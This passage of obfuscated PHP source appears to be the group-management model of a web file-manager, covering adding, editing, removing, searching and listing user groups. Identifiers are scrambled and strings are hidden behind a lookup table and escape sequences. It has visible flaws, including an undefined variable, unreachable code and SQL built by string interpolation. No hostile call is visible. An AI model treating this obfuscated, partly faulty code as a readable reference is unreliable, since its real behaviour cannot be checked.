Model($Û´ù¾­×[1426])->where($ŠÕˆ¨·ß)->count(); $Üé™‚ş¸ = Model($Û´ù¾­×[2049])->where($ŠÕˆ¨·ß)->count(); $€³”›… = intval($ŠëóÆÖ‡) + intval($Üé™‚ş¸); if ($€³”›… == 0) { Model($Û´ù¾­×[2050])->delete($®­ªší[$Û´ù¾­×[554]]); $this->where($ŠÕˆ¨·ß)->delete(); $this->metaSet($®­ªší[$Û´ù¾­×[554]], null, null); if (!IO::isFile($®­ªší[$Û´ù¾­×[87]])) { write_log(array($Û´ù¾­×[2051], ACTION, $®­ªší), $Û´ù¾­×[1262]); return !1; } IO::remove($®­ªší[$Û´ù¾­×[87]]); write_log(ACTION . $Û´ù¾­×[2052] . KodUser::id() . $Û´ù¾­×[2053] . $®­ªší[$Û´ù¾­×[554]] . $Û´ù¾­×[2054] . $®­ªší[$Û´ù¾­×[79]] . $Û´ù¾­×[202] . $®­ªší[$Û´ù¾­×[87]], $Û´ù¾­×[2051]); return; } if ($®­ªší[$Û´ù¾­×[2045]] != $€³”›…) { $this->where($ŠÕˆ¨·ß)->save(array($Û´ù¾­×[2038] => $€³”›…)); } } public function storageInfo($ÎÂÌ“¸É = false) { $½ø·¬àñ =& $_SERVER[äô®•½Â]; $æœñ¬ãÏ = $this->count() + 0.0; $Öá‰±¿ = 0; $‰‡…¸€ = 1; $¤áùœÚ¯ = 0; $ßç‡Ğ†ƒ = 5000; for ($ÇŠ»ø¡ = 0; $ÇŠ»ø¡ < $æœñ¬ãÏ; $ÇŠ»ø¡ = $ÇŠ»ø¡ + $ßç‡Ğ†ƒ) { $õ„“Ÿ¦Ö = $this->limit($ÇŠ»ø¡, $ÇŠ»ø¡ + $ßç‡Ğ†ƒ)->select(); foreach ($õ„“Ÿ¦Ö as $É¿ç¶“ã) { $‰‡…¸€ += $É¿ç¶“ã[$½ø·¬àñ[79]] * $É¿ç¶“ã[$½ø·¬àñ[2045]]; $Öá‰±¿ += $É¿ç¶“ã[$½ø·¬àñ[79]] * ($É¿ç¶“ã[$½ø·¬àñ[2045]] - 1); $¤áùœÚ¯ += $É¿ç¶“ã[$½ø·¬àñ[2045]]; } } $şôŸËˆ = array($½ø·¬àñ[2055] => $‰‡…¸€, $½ø·¬àñ[2056] => $Öá‰±¿, $½ø·¬àñ[2057] => $Öá‰±¿ / $‰‡…¸€, $½ø·¬àñ[83] => $æœñ¬ãÏ, $½ø·¬àñ[2058] => $¤áùœÚ¯); return $şôŸËˆ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\x65" => "\x67\162\157\x75\x70\x5f\x6d\145\164\141", "\x6d\145\x74\x61\106\151\145\154\144" => "\x67\162\157\165\x70\111\104"); protected function cacheFunctionAlias($ÖÌş«¦í) { $â€¨¥¾æ =& $_SERVER[äô®•½Â]; return array($â€¨¥¾æ[2059] => array($ÖÌş«¦í[0], $â€¨¥¾æ[2060]), $â€¨¥¾æ[2061] => array($ÖÌş«¦í[0], $â€¨¥¾æ[2062])); } protected function getInfo($ÆéÙ›•æ, $œĞ¹î€‘ = false) { $½ÇÛ¬› = $this->getInfoSimple($ÆéÙ›•æ); if (!$½ÇÛ¬›) { return !1; } if ($œĞ¹î€‘) { return $this->_listDataApplyItem($½ÇÛ¬›); } return $this->cacheFunctionGet($_SERVER[äô®•½Â][2063], $ÆéÙ›•æ); } protected function getInfoSimple($¥àÎİ»è, $©¦–œØŞ = false) { $Ğ¾»˜°¨ =& $_SERVER[äô®•½Â]; if ($©¦–œØŞ) { $›‘ù—ºô = array($Ğ¾»˜°¨[1388] => intval($¥àÎİ»è)); $ø‚ËÃö = $this->where($›‘ù—ºô)->find(); return is_array($ø‚ËÃö) ? $ø‚ËÃö : array(); } return $this->cacheFunctionGet($Ğ¾»˜°¨[2064], $¥àÎİ»è); } protected function groupAdd($“ÜÊ•…ï) { $˜Àù¿Á =& $_SERVER[äô®•½Â]; if (!$“ÜÊ•…ï[$˜Àù¿Á[193]] && isset($“ÜÊ•…ï[$˜Àù¿Á[1388]]) && $“ÜÊ•…ï[$˜Àù¿Á[1388]] == 1) { if ($‰¸·¨ü = $this->getInfoSimple($“ÜÊ•…ï[$˜Àù¿Á[1388]], !0)) { return $“ÜÊ•…ï[$˜Àù¿Á[1388]]; } } else { $‰¸·¨ü = $this->getInfoSimple($“ÜÊ•…ï[$˜Àù¿Á[193]]); if (!$‰¸·¨ü) { return !1; } } $Ü™·ó’÷ = $˜Àù¿Á[606]; if ($‰¸·¨ü[$˜Àù¿Á[597]]) { $Ü™·ó’÷ = $‰¸·¨ü[$˜Àù¿Á[597]] . $‰¸·¨ü[$˜Àù¿Á[1388]] . $˜Àù¿Á[50]; } $ÂìœÃé = array($˜Àù¿Á[505] => $this->groupNameAuto($“ÜÊ•…ï[$˜Àù¿Á[193]], $“ÜÊ•…ï[$˜Àù¿Á[32]]), $˜Àù¿Á[488] => $“ÜÊ•…ï[$˜Àù¿Á[193]], $˜Àù¿Á[668] => $Ü™·ó’÷, $˜Àù¿Á[2065] => $“ÜÊ•…ï[$˜Àù¿Á[1964]], $˜Àù¿Á[2066] => 0, $˜Àù¿Á[1981] => 0); $“ÜÊ•…ï[$˜Àù¿Á[32]] = $ÂìœÃé[$˜Àù¿Á[32]]; if (isset($“ÜÊ•…ï[$˜Àù¿Á[2001]])) { $ÂìœÃé[$˜Àù¿Á[2001]] = $“ÜÊ•…ï[$˜Àù¿Á[2001]]; } else { $»ºŠ‹Ú¹ = $this->max($˜Àù¿Á[2001]); if (!$»ºŠ‹Ú¹) { $»ºŠ‹Ú¹ = 0; } $ÂìœÃé[$˜Àù¿Á[2001]] = $»ºŠ‹Ú¹ + 1; } if (!empty($“ÜÊ•…ï[$˜Àù¿Á[1388]])) { $ÂìœÃé[$˜Àù¿Á[1388]] = $“ÜÊ•…ï[$˜Àù¿Á[1388]]; } $ú´ÜÛ½ô = $this->add($ÂìœÃé); $this->groupMetaEdit($ú´ÜÛ½ô, $“ÜÊ•…ï); Model($˜Àù¿Á[1426])->groupRootAdd($ú´ÜÛ½ô); $this->_clearCache($“ÜÊ•…ï[$˜Àù¿Á[193]]); return $ú´ÜÛ½ô; } protected function groupEdit($Å“äÚ…¥, $è¥ü Äü) { $ıü±œØı =& $_SERVER[äô®•½Â]; $Í¹½µÍØ = $this->getInfoSimple($Å“äÚ…¥); if (!$Í¹½µÍØ) { return !1; } if (!empty($è¥ü Äü[$ıü±œØı[193]])) { $ÄºÁÉ±Ÿ = $this->getInfoSimple($è¥ü Äü[$ıü±œØı[193]]); if (!$ÄºÁÉ±Ÿ) { return !1; } if ($Í¹½µÍØ[$ıü±œØı[1388]] == $ÄºÁÉ±Ÿ[$ıü±œØı[1388]]) { return !1; } if ($è¥ü Äü[$ıü±œØı[193]] != $Í¹½µÍØ[$ıü±œØı[193]]) { if ($ÄºÁÉ±Ÿ[$ıü±œØı[597]] !== $Í¹½µÍØ[$ıü±œØı[597]] && strpos($ÄºÁÉ±Ÿ[$ıü±œØı[597]], $Í¹½µÍØ[$ıü±œØı[597]] . $Í¹½µÍØ[$ıü±œØı[1388]] . $ıü±œØı[50]) === 0) { return !1; } $è¥ü Äü[$ıü±œØı[668]] = $ÄºÁÉ±Ÿ[$ıü±œØı[597]] . $è¥ü Äü[$ıü±œØı[193]] . $ıü±œØı[50]; $this->_changeChildLevel($Í¹½µÍØ, $ÄºÁÉ±Ÿ); $this->_clearCache($ÄºÁÉ±Ÿ[$ıü±œØı[1388]]); $this->_clearCache($Í¹½µÍØ[$ıü±œØı[193]]); } } $this->groupMetaEdit($Å“äÚ…¥, $è¥ü Äü); $this->_clearChildrenCache($Í¹½µÍØ); return $this->where(array($ıü±œØı[2067] => $Å“äÚ…¥))->save($è¥ü Äü); } private function groupMetaEdit($ç£²èÙÈ, &$†¡ß÷œ) { $ïÈüóáš =& $_SERVER[äô®•½Â]; if (isset($†¡ß÷œ[$ïÈüóáš[32]])) { $this->setNamePinyin($ç£²èÙÈ, $†¡ß÷œ[$ïÈüóáš[32]]); } if (isset($†¡ß÷œ[$ïÈüóáš[2068]])) { $Î³æË­» = array($ïÈüóáš[2068] => $†¡ß÷œ[$ïÈüóáš[2068]], $ïÈüóáš[2069] => $†¡ß÷œ[$ïÈüóáš[2069]]); unset($†¡ß÷œ[$ïÈüóáš[2068]]); unset($†¡ß÷œ[$ïÈüóáš[2069]]); if (isset($†¡ß÷œ[$ïÈüóáš[2070]])) { $Ê—Ÿò¤ö = $ïÈüóáš[1384] . $ç£²èÙÈ; $ªŞü…Òš = $ïÈüóáš[1383]; $’ºÑŸ’¬ = $†¡ß÷œ[$ïÈüóáš[2070]] ? $†¡ß÷œ[$ïÈüóáš[2070]] : $ïÈüóáš[12]; $«¿ƒ´¼÷ = Model($ïÈüóáš[1382])->get($Ê—Ÿò¤ö, $ªŞü…Òš); $«¿ƒ´¼÷ = $«¿ƒ´¼÷ ? $«¿ƒ´¼÷ : $ïÈüóáš[12]; if ($«¿ƒ´¼÷ != $’ºÑŸ’¬) { if (!$’ºÑŸ’¬ && $«¿ƒ´¼÷) { Model($ïÈüóáš[1382])->remove($Ê—Ÿò¤ö, $ªŞü…Òš); } else { if ($’ºÑŸ’¬) { Model($ïÈüóáš[1382])->set($Ê—Ÿò¤ö, $’ºÑŸ’¬, $ªŞü…Òš); } } } $Î³æË­»[$ïÈüóáš[2070]] = $’ºÑŸ’¬; } $this->metaSet($ç£²èÙÈ, $Î³æË­»); } } private function _clearChildrenCache($´¥´øĞ) { $ô³ãûë =& $_SERVER[äô®•½Â]; $û±ƒüıí = array($ô³ãûë[668] => array($ô³ãûë[628], $´¥´øĞ[$ô³ãûë[597]] . $´¥´øĞ[$ô³ãûë[1388]] . $ô³ãûë[629])); $ã–Â©‡¯ = $this->field($ô³ãûë[1388])->where($û±ƒüıí)->select(); foreach ($ã–Â©‡¯ as $Ëø„Ëİù) { $this->_clearCache($Ëø„Ëİù[$ô³ãûë[1388]]); } } private function _clearCache($’× Ø ) { $ÑÈáºèı =& $_SERVER[äô®•½Â]; $this->cacheFunctionClear($ÑÈáºèı[2063], $’× Ø ); $this->cacheFunctionClear($ÑÈáºèı[2064], $’× Ø ); } private function _changeChildLevel($«÷êÓœ, $®éŠ®¾î, $±Á‹¶ = false) { $¡ıâ€Ä¸ =& $_SERVER[äô®•½Â]; $Ÿòñ”ô¬ = $«÷êÓœ[$¡ıâ€Ä¸[597]] . $«÷êÓœ[$¡ıâ€Ä¸[1388]] . $¡ıâ€Ä¸[50]; $Ğï±‰Ñ = $®éŠ®¾î[$¡ıâ€Ä¸[597]] . $®éŠ®¾î[$¡ıâ€Ä¸[1388]] . $¡ıâ€Ä¸[50] . $«÷êÓœ[$¡ıâ€Ä¸[1388]] . $¡ıâ€Ä¸[50]; if ($±Á‹¶) { $Ğï±‰Ñ = $®éŠ®¾î[$¡ıâ€Ä¸[597]] . $®éŠ®¾î[$¡ıâ€Ä¸[1388]] . $¡ıâ€Ä¸[50]; } $·ÜŞÜû» = array($¡ıâ€Ä¸[668] => array($¡ıâ€Ä¸[628], $«÷êÓœ[$¡ıâ€Ä¸[597]] . $«÷êÓœ[$¡ıâ€Ä¸[1388]] . $¡ıâ€Ä¸[629])); $åÜµ–¤ì = array($¡ıâ€Ä¸[668] => array($¡ıâ€Ä¸[677], "\162\x65\x70\x6c\141\x63\145\x28\x70\x61\162\x65\156\164\114\x65\x76\x65\154\x2c\47{$Ÿòñ”ô¬}\47\x2c\47{$Ğï±‰Ñ}\x27\51")); $this->_clearChildrenCache($«÷êÓœ); $this->where($·ÜŞÜû»)->data($åÜµ–¤ì)->save(); } public function setNamePinyin($Ôâı†¬, $â¼×¦À = false) { $¥‰İ¥Çƒ =& $_SERVER[äô®•½Â]; if (!$â¼×¦À) { $õ§³÷¼İ = $this->getInfoSimple($Ôâı†¬); $â¼×¦À = $õ§³÷¼İ[$¥‰İ¥Çƒ[32]]; } if (!Input::check($â¼×¦À, $¥‰İ¥Çƒ[671])) { $this->metaSet($Ôâı†¬, $¥‰İ¥Çƒ[549], null); $this->metaSet($Ôâı†¬, $¥‰İ¥Çƒ[548], null); return; } $°ì¢Ş¥ = array($¥‰İ¥Çƒ[549] => str_replace($¥‰İ¥Çƒ[53], $¥‰İ¥Çƒ[12], Pinyin::get($â¼×¦À)), $¥‰İ¥Çƒ[548] => Pinyin::get($â¼×¦À, $¥‰İ¥Çƒ[672])); $this->metaSet($Ôâı†¬, $°ì¢Ş¥); } protected function metaSet($İ÷ô¹îâ, $Ä‚¿Çò” = null, $Ì˜Ô±ôı = null) { $this->_clearCache($İ÷ô¹îâ); return parent::metaSet($İ÷ô¹îâ, $Ä‚¿Çò”, $Ì˜Ô±ôı); } protected function groupStatus($ëıáÕ¤Ş, $Œ³„ºÙ‹) { $öêÅ£îÕ =& $_SERVER[äô®•½Â]; $êüúŞ¡ = $this->getInfoSimple($ëıáÕ¤Ş); if (!$êüúŞ¡) { return !1; } $this->_clearCache($ëıáÕ¤Ş); return $this->metaSet($ëıáÕ¤Ş, $öêÅ£îÕ[815], $Œ³„ºÙ‹); if ($Œ³„ºÙ‹ == $öêÅ£îÕ[91]) { $‚¦„È”î = $this->parentLevelArray($êüúŞ¡[$öêÅ£îÕ[597]]); } else { } $‚¦„È”î[] = $êüúŞ¡[$öêÅ£îÕ[1388]]; $ï¸òğ—û = array(); foreach ($‚¦„È”î as $ëıáÕ¤Ş) { $ï¸òğ—û[] = array($öêÅ£îÕ[1388] => $ëıáÕ¤Ş, $öêÅ£îÕ[97] => $öêÅ£îÕ[815], $öêÅ£îÕ[461] => $Œ³„ºÙ‹); $this->_clearCache($ëıáÕ¤Ş); } return Model($öêÅ£îÕ[2071])->addAll($ï¸òğ—û, array(), !0); } protected function groupRemove($€Äˆ„ù, $ó©¢Æù¤ = false) { $İÅŸ¥ØŞ =& $_SERVER[äô®•½Â]; $­›Ìë = array($İÅŸ¥ØŞ[1388] => $€Äˆ„ù); $¾ÆÖªÁÓ = $this->where($­›Ìë)->find(); if (!$¾ÆÖªÁÓ || $¾ÆÖªÁÓ[$İÅŸ¥ØŞ[193]] == 0) { return !1; } if (!$ó©¢Æù¤) { $Ö»İ¢ã = $this->getInfoSimple($¾ÆÖªÁÓ[$İÅŸ¥ØŞ[193]]); $this->_changeChildLevel($¾ÆÖªÁÓ, $Ö»İ¢ã, !0); $this->where(array($İÅŸ¥ØŞ[193] => $€Äˆ„ù))->save(array($İÅŸ¥ØŞ[193] => $¾ÆÖªÁÓ[$İÅŸ¥ØŞ[193]])); $this->_clearCache($Ö»İ¢ã[$İÅŸ¥ØŞ[1388]]); } Model($İÅŸ¥ØŞ[2071])->where($­›Ìë)->delete(); Model($İÅŸ¥ØŞ[2072])->where($­›Ìë)->delete(); Model($İÅŸ¥ØŞ[896])->groupRootRemove($€Äˆ„ù); $this->_clearCache($¾ÆÖªÁÓ[$İÅŸ¥ØŞ[193]]); return $this->where($­›Ìë)->delete(); } protected function groupSort($¬ÃÒ”¥µ) { $»¤ßÀÉ =& $_SERVER[äô®•½Â]; $ĞôÒêÁÅ = array(); foreach ($¬ÃÒ”¥µ as $÷ˆ‡éÏ => $ˆë§÷±) { $ĞôÒêÁÅ[] = array($»¤ßÀÉ[1388], $ˆë§÷±, $»¤ßÀÉ[2001], $÷ˆ‡éÏ + 1); } $this->saveAll($ĞôÒêÁÅ); } public function listData() { $¶…†ïÛ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¶…†ïÛ[$_SERVER[äô®•½Â][456]]); return $¶…†ïÛ; } private function _makeOrder($Ğİ©¥£ù = '') { $•—È¯Á“ =& $_SERVER[äô®•½Â]; $«Œˆâ¸¥ = array($•—È¯Á“[1388], $•—È¯Á“[32], $•—È¯Á“[1966], $•—È¯Á“[234]); $®ö¾ŠåÔ = array($•—È¯Á“[534] => $•—È¯Á“[535], $•—È¯Á“[536] => $•—È¯Á“[537]); $œöşÃƒ = Input::get($•—È¯Á“[541], $•—È¯Á“[7], $•—È¯Á“[1981], $«Œˆâ¸¥); $ÎˆÅÔÕ® = Input::get($•—È¯Á“[542], $•—È¯Á“[7], $•—È¯Á“[2073], array($•—È¯Á“[2073], $•—È¯Á“[536])); $ÎˆÅÔÕ® = $®ö¾ŠåÔ[$ÎˆÅÔÕ®]; $Ğİ©¥£ù = $Ğİ©¥£ù . "{$œöşÃƒ}\40{$ÎˆÅÔÕ®}\x2c\x20\147\162\x6f\165\160\111\104\x20\141\x73\x63"; return $this->order($Ğİ©¥£ù); } public function listChild($öÀ—íÖ) { $½•­Ë™ =& $_SERVER[äô®•½Â]; $âúç£Ê¬ = $this->where(array($½•­Ë™[193] => $öÀ—íÖ))->_makeOrder()->selectPage(200); $this->_listDataApply($âúç£Ê¬[$½•­Ë™[456]]); return $âúç£Ê¬; } public function listChildIds($ıõ£õ¥Œ) { $šÀ»åıå =& $_SERVER[äô®•½Â]; if (is_string($ÌÜ®¼”Í)) { $ıõ£õ¥Œ = explode($šÀ»åıå[50], $ıõ£õ¥Œ); } $¶‚ùÏ“í = $this->where(array($šÀ»åıå[1388] => array($šÀ»åıå[7], $ıõ£õ¥Œ)))->field($šÀ»åıå[2074])->select(); if (!$¶‚ùÏ“í) { return !1; } $Ì½ÖÉ = array(); foreach ($¶‚ùÏ“í as $å–Ê´ö) { $Ì½ÖÉ[] = "\x73\145\x6c\x65\143\164\40\x67\x72\157\165\x70\111\104\40\146\162\157\x6d\x20\x60\x67\162\157\x75\160\x60\x20\x77\x68\x65\x72\x65\40\160\141\162\145\156\164\x4c\x65\166\x65\x6c\x20\x6c\151\x6b\145\40\47{$å–Ê´ö[$šÀ»åıå[597]]}{$å–Ê´ö[$šÀ»åıå[1388]]}\x2c\45\47"; } $Ì½ÖÉ = implode($šÀ»åıå[2075], $Ì½ÖÉ); $¶‚ùÏ“í = $this->query($Ì½ÖÉ); if (!$¶‚ùÏ“í) { return array(); } $ıõ£õ¥Œ = array_to_keyvalue($¶‚ùÏ“í, $šÀ»åıå[12], $šÀ»åıå[1388]); return array_unique($ıõ£õ¥Œ); } public function listByID($´œ…¼›Á) { $—ËÛ¡Í’ =& $_SERVER[äô®•½Â]; if (!$´œ…¼›Á) { return array(); } $ñ¶òˆğ× = array($—ËÛ¡Í’[1388] => array($—ËÛ¡Í’[7], $´œ…¼›Á)); $œá…¾è¼ = $this->where($ñ¶òˆğ×)->select(); $œá…¾è¼ = array_sort_keep($œá…¾è¼, $—ËÛ¡Í’[1388], $´œ…¼›Á); $this->_listDataApply($œá…¾è¼); return $œá…¾è¼; } public function listSearch($š’‡Üİı) { $ê°™›ñÑ =& $_SERVER[äô®•½Â]; $šûä± = trim($š’‡Üİı[$ê°™›ñÑ[2076]]); $œÌ¾¿¤¨ = explode($ê°™›ñÑ[53], $šûä±); if (!$šûä± || count($œÌ¾¿¤¨) == 1) { return $this->listSearchNow($š’‡Üİı); } $€¼ßŸò = array($ê°™›ñÑ[456] => array()); foreach ($œÌ¾¿¤¨ as $ËªÙàÍ›) { if (!trim($ËªÙàÍ›)) { continue; } $š’‡Üİı[$ê°™›ñÑ[2076]] = $ËªÙàÍ›; $Óêö’åº = $this->listSearchNow($š’‡Üİı); $€¼ßŸò[$ê°™›ñÑ[456]] = array_merge($€¼ßŸò[$ê°™›ñÑ[456]], $Óêö’åº[$ê°™›ñÑ[456]]); } $€¼ßŸò[$ê°™›ñÑ[456]] = array_unique_by_key($€¼ßŸò[$ê°™›ñÑ[456]], $ê°™›ñÑ[1388]); $€¼ßŸò[$ê°™›ñÑ[453]] = array($ê°™›ñÑ[454] => count($€¼ßŸò[$ê°™›ñÑ[456]]), $ê°™›ñÑ[450] => 20, $ê°™›ñÑ[439] => 1, $ê°™›ñÑ[455] => 1); return $€¼ßŸò; } public function listSearchNow($ı¦ËÊü„) { $²ÖÁ•Ş§ =& $_SERVER[äô®•½Â]; $•¾ä­­ó = trim($ı¦ËÊü„[$²ÖÁ•Ş§[2076]]); $‚¦Á³’³ = isset($ı¦ËÊü„[$²ÖÁ•Ş§[2077]]) ? $ı¦ËÊü„[$²ÖÁ•Ş§[2077]] : !1; if (!trim($•¾ä­­ó)) { return !1; } $•¾ä­­ó = str_replace($²ÖÁ•Ş§[2078], $²ÖÁ•Ş§[2079], $•¾ä­­ó); $ëÄĞíÅ = array($²ÖÁ•Ş§[1388] => array($²ÖÁ•Ş§[470], "{$•¾ä­­ó}\45"), $²ÖÁ•Ş§[32] => array($²ÖÁ•Ş§[470], "\45{$•¾ä­­ó}\x25"), $²ÖÁ•Ş§[1072] => $²ÖÁ•Ş§[2080]); if ($‚¦Á³’³) { $øò´úšÃ = $this->getInfoSimple($‚¦Á³’³); $¸ë²ÁÁ = $øò´úšÃ[$²ÖÁ•Ş§[597]] . $‚¦Á³’³ . $²ÖÁ•Ş§[629]; $ëÄĞíÅ = array($ëÄĞíÅ, array($²ÖÁ•Ş§[597] => array($²ÖÁ•Ş§[470], $¸ë²ÁÁ))); } $ëÄĞíÅ = $this->parseWhereLike($ëÄĞíÅ); $ÂÊÂíÃú = $this->_makeOrder()->where($ëÄĞíÅ)->selectPage(20); $ÂÊÂíÃú = $ÂÊÂíÃú ? $ÂÊÂíÃú : array($²ÖÁ•Ş§[456] => array(), $²ÖÁ•Ş§[453] => array()); if (!$ÂÊÂíÃú || count($ÂÊÂíÃú[$²ÖÁ•Ş§[456]]) < 5 && Input::check($•¾ä­­ó, $²ÖÁ•Ş§[404])) { $ôé­Şâ´ = $this->groupChildrenAll($‚¦Á³’³); $ØÖö„Äã = $this->_searchFromMeta($²ÖÁ•Ş§[548], $•¾ä­­ó, 10, $ôé­Şâ´); $©€ÄÇİç = $this->_searchFromMeta($²ÖÁ•Ş§[549], $•¾ä­­ó, 10, $ôé­Şâ´); $‚„Ş‹ç = array_merge($ØÖö„Äã, $©€ÄÇİç, $ÂÊÂíÃú[$²ÖÁ•Ş§[456]]); $ÂÊÂíÃú[$²ÖÁ•Ş§[456]] = array_unique_by_key($‚„Ş‹ç, $²ÖÁ•Ş§[1388]); $ÂÊÂíÃú[$²ÖÁ•Ş§[453]][$²ÖÁ•Ş§[454]] = count($ÂÊÂíÃú[$²ÖÁ•Ş§[456]]); $ÂÊÂíÃú[$²ÖÁ•Ş§[453]][$²ÖÁ•Ş§[455]] = ceil($ÂÊÂíÃú[$²ÖÁ•Ş§[453]][$²ÖÁ•Ş§[454]] / $ÂÊÂíÃú[$²ÖÁ•Ş§[453]][$²ÖÁ•Ş§[450]]); } $this->_listDataApply($ÂÊÂíÃú[$²ÖÁ•Ş§[456]]); return $ÂÊÂíÃú; } protected function groupChildrenAll($º€„Ø’¿) { $ëÑœáË´ =& $_SERVER[äô®•½Â]; if (!$º€„Ø’¿) { return !1; } if (!is_array($º€„Ø’¿)) { $º€„Ø’¿ = array($º€„Ø’¿); } $©ş´‚’ = $º€„Ø’¿; foreach ($º€„Ø’¿ as $±ªÂŸ›‚) { $¬ğÈ³æ‡ = $this->getInfoSimple($±ªÂŸ›‚); $Ø½ĞÕÒ© = array($ëÑœáË´[597] => array($ëÑœáË´[470], $¬ğÈ³æ‡[$ëÑœáË´[597]] . $±ªÂŸ›‚ . $ëÑœáË´[629])); $Üàğçìµ = $this->field($ëÑœáË´[1388])->where($Ø½ĞÕÒ©)->select(); $©ş´‚’ = array_merge($©ş´‚’, array_to_keyvalue($Üàğçìµ, $ëÑœáË´[12], $ëÑœáË´[1388])); } return array_unique($©ş´‚’); } private function _searchFromMeta($Æ÷£º¶¼, $€³—×ÌÆ, $İ§†ƒ, $Ö¶¶‹®Ş) { $¤ÛÑÉº =& $_SERVER[äô®•½Â]; $€³—×ÌÆ = strtolower($€³—×ÌÆ); $«»”€„ = array($¤ÛÑÉº[97] => $Æ÷£º¶¼, $¤ÛÑÉº[461] => array($¤ÛÑÉº[470], "\x25{$€³—×ÌÆ}\x25")); $«»”€„ = $this->parseWhereLike($«»”€„); if ($Ö¶¶‹®Ş) { $«»”€„[$¤ÛÑÉº[1388]] = array($¤ÛÑÉº[7], $Ö¶¶‹®Ş); } $ëÊø‘ï = Model($¤ÛÑÉº[2081])->where($«»”€„)->limit($İ§†ƒ)->select(); if (!$ëÊø‘ï) { return array(); } $ëÊø‘ï = array_to_keyvalue($ëÊø‘ï, $¤ÛÑÉº[12], $¤ÛÑÉº[1388]); $¿„½ ãÍ = $this->where(array($¤ÛÑÉº[2067] => array($¤ÛÑÉº[7], $ëÊø‘ï)))->select(); if (!$¿„½ ãÍ) { return array(); } return $¿„½ ãÍ; } protected function _listDataApplyItem($¥Êûµêğ) { $Î—ÛÛ½ñ = array($¥Êûµêğ); $this->_listDataApply($Î—ÛÛ½ñ); return $Î—ÛÛ½ñ[0]; } protected function _listDataApply(&$Ì‘ã²…Ş) { $õ§Ì–úš =& $_SERVER[äô®•½Â]; if (!$Ì‘ã²…Ş) { return; } $ã§ö¾õá = array_to_keyvalue($Ì‘ã²…Ş, $õ§Ì–úš[12], $õ§Ì–úš[1388]); $this->_listAppendChildren($Ì‘ã²…Ş); $this->_listAppendChildrenMember($Ì‘ã²…Ş); $this->_listAppendMeta($Ì‘ã²…Ş, $ã§ö¾õá); $this->_listAppendParent($Ì‘ã²…Ş); $this->_listAppendSourceRoot($Ì‘ã²…Ş, $ã§ö¾õá); } private function _listAppendChildren(&$³Âéˆš) { $°ÙßÏÀ =& $_SERVER[äô®•½Â]; $öú®ãü = array_to_keyvalue($³Âéˆš, $°ÙßÏÀ[12], $°ÙßÏÀ[1388]); $æå‘³…» = array($°ÙßÏÀ[193] => array($°ÙßÏÀ[7], $öú®ãü)); $àıÅ§Œİ = array($°ÙßÏÀ[193], $°ÙßÏÀ[2082] => $°ÙßÏÀ[578]); $Ã”Ä„²ô = $this->field($àıÅ§Œİ)->where($æå‘³…»)->group($°ÙßÏÀ[193])->select(); $¦Ìáâ¡ = array_to_keyvalue($Ã”Ä„²ô, $°ÙßÏÀ[193], $°ÙßÏÀ[578]); foreach ($³Âéˆš as &$Ú¿ê†²) { $»Ø­Ÿç = $Ú¿ê†²[$°ÙßÏÀ[1388]]; $Ú¿ê†²[$°ÙßÏÀ[2083]] = isset($¦Ìáâ¡[$»Ø­Ÿç]) ? intval($¦Ìáâ¡[$»Ø­Ÿç]) : !1; } unset($Ú¿ê†²); } private function _listAppendChildrenMember(&$¹Åñıµ–) { $«‘¤°¨€ =& $_SERVER[äô®•½Â]; $ø“Îèêã = array_to_keyvalue($¹Åñıµ–, $«‘¤°¨€[12], $«‘¤°¨€[1388]); $±”Øàí = array($«‘¤°¨€[1388] => array($«‘¤°¨€[7], $ø“Îèêã)); $´©øĞ‚ = array($«‘¤°¨€[1388], $«‘¤°¨€[2082] => $«‘¤°¨€[578]); $¤£Õ±ŠÒ = Model($«‘¤°¨€[2072])->field($´©øĞ‚)->where($±”Øàí)->group($«‘¤°¨€[1388])->select(); $İ‰¢Ÿ¬“ = array_to_keyvalue($¤£Õ±ŠÒ, $«‘¤°¨€[1388], $«‘¤°¨€[578]); foreach ($¹Åñıµ– as &$İ—™¯Õ) { $ ¼ˆÏ³Ö = $İ—™¯Õ[$«‘¤°¨€[1388]]; $İ—™¯Õ[$«‘¤°¨€[2084]] = isset($İ‰¢Ÿ¬“[$ ¼ˆÏ³Ö]) ? intval($İ‰¢Ÿ¬“[$ ¼ˆÏ³Ö]) : !1; } unset($İ—™¯Õ); } private function _listAppendMeta(&$´ƒÔú¹, $ª”ğÎ™Ø) { $‘­€íÍ§ =& $_SERVER[äô®•½Â]; $ëÂ»´êÓ = array($‘­€íÍ§[1388] => array($‘­€íÍ§[7], $ª”ğÎ™Ø)); $®ó‡¾Ş = Model($‘­€íÍ§[2071])->where($ëÂ»´êÓ)->select(); $®ó‡¾Ş = array_to_keyvalue_group($®ó‡¾Ş, $‘­€íÍ§[1388]); foreach ($®ó‡¾Ş as &$ğ¦Îˆ©½) { $ğ¦Îˆ©½ = array_to_keyvalue($ğ¦Îˆ©½, $‘­€íÍ§[97], $‘­€íÍ§[461]); } unset($ğ¦Îˆ©½); foreach ($´ƒÔú¹ as &$Éšéşø×) { $Éšéşø×[$‘­€íÍ§[552]] = array(); if (isset($®ó‡¾Ş[$Éšéşø×[$‘­€íÍ§[1388]]])) { $Éšéşø×[$‘­€íÍ§[552]] = $®ó‡¾Ş[$Éšéşø×[$‘­€íÍ§[1388]]]; } } unset($Éšéşø×); } protected function parentLevelArray($¸´ı½¢À) { $†²¯¹æú =& $_SERVER[äô®•½Â]; $¸´ı½¢À = explode($†²¯¹æú[50], trim($¸´ı½¢À, $†²¯¹æú[50])); $¸´ı½¢À = array_remove_value($¸´ı½¢À, $†²¯¹æú[231]); return $¸´ı½¢À; } protected function parentInGroup($İ„²ê…, $ˆäüô£É) { $²€îÁÏ° =& $_SERVER[äô®•½Â]; $ÈÍ¯×Îå = $this->getInfoSimple($İ„²ê…); if (!$ÈÍ¯×Îå) { return !0; } $­È†ù² = $this->parentLevelArray($ÈÍ¯×Îå[$²€îÁÏ°[597]]); $­È†ù²[] = $İ„²ê…; foreach ($­È†ù² as $İ„²ê…) { if (in_array($İ„²ê… . $²€îÁÏ°[12], $ˆäüô£É)) { return !0; } } return !1; } private function _listAppendParent(&$©ú” ¼) { $úÔáìõ† =& $_SERVER[äô®•½Â]; $†°âÅí = array(); foreach ($©ú” ¼ as &$»ó„Û¯Ï) { $†°âÅí[$»ó„Û¯Ï[$úÔáìõ†[1388]]] = $»ó„Û¯Ï[$úÔáìõ†[32]]; $İÖæ¥ = $this->parentLevelArray($»ó„Û¯Ï[$úÔáìõ†[597]]); foreach ($İÖæ¥ as 